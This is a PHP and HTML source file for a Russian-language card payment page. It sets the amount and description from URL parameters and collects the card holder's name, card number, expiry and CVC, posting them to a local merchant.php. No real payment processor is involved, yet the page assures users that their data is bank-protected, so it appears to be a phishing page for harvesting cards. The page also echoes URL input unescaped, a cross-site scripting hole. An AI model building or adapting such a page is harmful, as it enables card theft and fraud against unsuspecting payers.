<?php

error_reporting(0);
include "config.php";

$amount = $_GET["amount"];

$description = $_GET["item"];
$order = rand(10000000, 99999999);

if (!isset($amount) || $amount == "" || $amount < 10 || $amount > 150000) {
	$amount = 15;
}

if (!isset($description) || $description == "") {
	$description = "Оплата счета на сумму " . number_format($amount, 0, "", " ") . ",00 ₽";
}

?>

<!DOCTYPE html>
<html>
	<head>
		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&amp;subset=cyrillic">
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
		<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
		<link rel="stylesheet" type="text/css" href="css/common.css">
		<link rel="shortcut icon" type="image/png" href="img/fav-icon.png">

		<script type="text/javascript" src="js/jquery.js"></script>
		<script type="text/javascript" src="js/bootstrap.js"></script>
		<script type="text/javascript" src="js/common.js"></script>

		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

		<title><?php echo $title; ?></title>
	</head>

	<body>
		<div class="block-info">
			<h3 class="heading-info">
				<?php echo $heading; ?>
			</h3>

			<p class="description-info">
				<?php echo $description; ?>
			</p>
		</div>

		<div class="divider"></div>

		<div class="block-method">
			<div class="row">
				<div class="list-method">
					<div class="row">
						<div class="col-xs-6">
							<div class="item-method active-method">
								<img src="img/logo-card.svg">
							</div>
						</div>

						<div class="col-xs-6">
							<div class="item-method">
								<img src="img/logo-other.svg">
							</div>
						</div>

						<div class="col-xs-12">
							<div class="description-method">
								<p>Оплата с помощью банковской карты VISA или MasterCard. Безопасность обработки платежа по пластиковым картам гарантирует банк-эквайер.</p>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>

		<div class="block-form">
			<form class="form-payment" action="merchant.php" method="post">
				<div class="form-group">
    					<label for="input-holder">Владелец карты</label>
    					<input type="text" class="form-control" id="input-holder" name="card_holder" placeholder="IVAN IVANOV">
				</div>

				<div class="form-group">
    					<label for="input-number">Номер карты</label>
    					<input type="text" class="form-control" id="input-number" name="card_number" data-type="number" placeholder="0000 0000 0000 0000">
				</div>

				<div class="row">
					<div class="col-xs-4">
						<div class="form-group">
		    					<label for="input-month">Срок действия</label>
		    					<input type="text" class="form-control" id="input-month" name="mm" data-type="number" placeholder="01" maxlength="2">
						</div>
					</div>

					<div class="col-xs-4">
						<div class="form-group">
						    	<label for="input-month">Дата</label>
		    					<input type="text" class="form-control" id="input-year" name="yy" data-type="number" placeholder="19" maxlength="2">
						</div>
					</div>

					<div class="col-xs-4">
						<div class="form-group">
		    					<label for="input-code">
		    						CVC-код
		    						<i class="far fa-question-circle" data-toggle="tooltip" data-placement="top" title="3 цифры на обороте карты"></i>
		    					</label>

		    					<input type="password" class="form-control" id="input-code" name="cvc" data-type="number" placeholder="•••" maxlength="3">
						</div>
					</div>
				</div>

				<input type="hidden" name="amount" value="<?php echo $amount; ?>">
				<input type="hidden" name="order" value="<?php echo $order; ?>">
				<input type="hidden" name="item" value="<?php echo $description; ?>">
			</form>

			<div class="block-form-info">
				<h4 class="heading-total">Итого к оплате: <b><?php echo number_format($amount, 0, "", " "); ?>,00 ₽</b></h4>
				<p class="heading-secure">
					<i class="fas fa-lock"></i> Ваши данные надежно защищены.
				</p>
			</div>
		</div>

		<div class="divider"></div>

		<div class="block-footer">
			<div class="row">
				<div class="col-xs-6">
					<a class="button-secondary">
						<i class="fas fa-chevron-left"></i> Назад
					</a>
				</div>

				<div class="col-xs-6">
					<a class="button-primary">
						<i class="fas fa-chevron-right"></i> Оплатить
					</a>
				</div>
			</div>
		</div>
	</body>
</html>